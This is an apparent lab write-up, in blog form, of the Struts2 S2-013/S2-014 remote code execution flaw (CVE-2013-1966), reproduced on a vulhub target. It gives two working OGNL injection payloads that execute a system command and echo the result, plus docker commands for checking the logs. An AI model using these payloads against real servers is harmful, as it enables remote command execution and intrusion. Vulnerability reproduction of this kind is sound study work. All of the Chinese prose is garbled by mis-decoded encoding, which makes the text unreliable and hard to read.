# CVE-2013-1966 S2-013/014 å¤ç° - ç¾å¼åŠ ç³– - åšå®¢å›­

> åŸæ–‡ï¼š[`www.cnblogs.com/peace-and-romance/p/15635493.html`](https://www.cnblogs.com/peace-and-romance/p/15635493.html)

### 0X00-å¼•è¨€

* * *

å›å®¶å–½ï¼Œå…»çŒªå»å–½ï¼Œå­¦äº†åŠå¹´çš„æ¯çŒªäº§åæŠ¤ç†ç»ˆäºå¯ä»¥å®ç°å–½ğŸ˜›

### 0X01-ç¯å¢ƒæ­å»º

* * *

é¶æœºï¼šCentOS Linux 7

æ”»å‡»æœºï¼šwindows server 2016 && Kail

ç¯å¢ƒï¼švulhub

é¡¹ç›®åœ°å€ï¼š[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

æ­å»º vulhub è¯·è®¿é—®ï¼š[ç©ºç™½ centos7 64 æ­å»º vulhub(è¯¦ç»†)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-æ¼æ´æè¿°

* * *

Struts2 æ ‡ç­¾ä¸­`<s:a>`å’Œ`<s:url>`éƒ½åŒ…å«ä¸€ä¸ª includeParams å±æ€§ï¼Œå…¶å€¼å¯ä»¥ä¸º noneï¼Œget æˆ– set allï¼Œå‚è€ƒå®˜æ–¹å¯¹åº”çš„å«ä¹‰å¦‚ä¸‹ï¼š

1.  none - é“¾æ¥ä¸åŒ…å«è¯·æ±‚çš„ä»»æ„å‚æ•°å€¼ï¼ˆé»˜è®¤ï¼‰
2.  get - é“¾æ¥åªåŒ…å« GET è¯·æ±‚ä¸­çš„å‚æ•°å’Œå…¶å€¼
3.  å…¨éƒ¨ - é“¾æ¥åŒ…å« GET å’Œ POST æ‰€æœ‰å‚æ•°å’Œå…¶ä»·å€¼

`<s:a>`æ”¯æŒæ˜¾ç¤ºä¸€ä¸ªé“¾æ¥ï¼Œå½“`includeParams=all`çš„æ—¶å€™ï¼Œå‚æ•°è¶…æœ¬æ¬¡çš„ GET å’Œ POST éƒ½é‡‡ç”¨ URL çš„å‚æ•°ä¸Šã€‚

S2-014 æ˜¯å¯¹ S2-013 ä¿®å¤çš„åŠ å¼ºï¼Œåœ¨ S2-013 ä¿®å¤çš„ä»£ç ä¸­ç–å¿½äº† ${ognl_exp} OGNL è¡¨è¾¾å¼æ‰§è¡Œçš„ï¼Œå› æ­¤ S2-014 æ˜¯ä»–çš„ä¿®å¤æ–¹å¼ã€‚

å½±å“ç‰ˆæœ¬ï¼š2.0.0 - 2.3.14.1

æ¼æ´è¯¦æƒ…ï¼š

*   [`struts.apache.org/docs/s2-013.html`](http://struts.apache.org/docs/s2-013.html)
*   [`struts.apache.org/docs/s2-014.html`](http://struts.apache.org/docs/s2-014.html)

### 0X03-æ¼æ´å¤ç°

* * *

##### 01-ä»»æ„å‘½ä»¤æ‰§è¡Œ

poc

```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
// æˆ–
${#_memberAccess["allowStaticMethodAccess"]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())} 
```

æ³¨æ„ url ç¼–ç 

![image-20211202103505302](img/d58e00bc662322c71800811474313855.png)

è¿›å…¥ç¯å¢ƒç‚¹å‡»

![image-20211202103340200](img/f4f559a97f771386cfd77ffc670359a8.png)

æŠ“åŒ…-ä¿®æ”¹

![image-20211202103854945](img/7b9bb1189dd804650ca68cf318baf638.png)

### 0X04-æ¼æ´åˆ†æ

* * *

ç•¥ï¼Œæš‚æ—¶çœ‹ä¸æ‡‚æºç ä»¥åä¼šè¡¥å……

### 0X05-æŸ¥çœ‹æ—¥å¿—

* * *

```
docker ps #æŸ¥çœ‹å®¹å™¨ ID
docker exec -it ID /bin/bash #è¿›å…¥
cd logs #è¿›å…¥æ—¥å¿—ç›®å½•
cat localhost_access_log.2021-12-02.txt #æŸ¥çœ‹æ—¥å¿—
exit #é€€å‡ºå®¹å™¨ 
```

æ—¥å¿—ä¸­ä¼šè®°å½•æ”»å‡»æ‰‹æ³•

![image-20211202104120824](img/abe424e95a627c4f2b38cabaa117fb75.png)

### 0X06-å‚è€ƒ

* * *

[S2-013/S2-014 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´](https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md)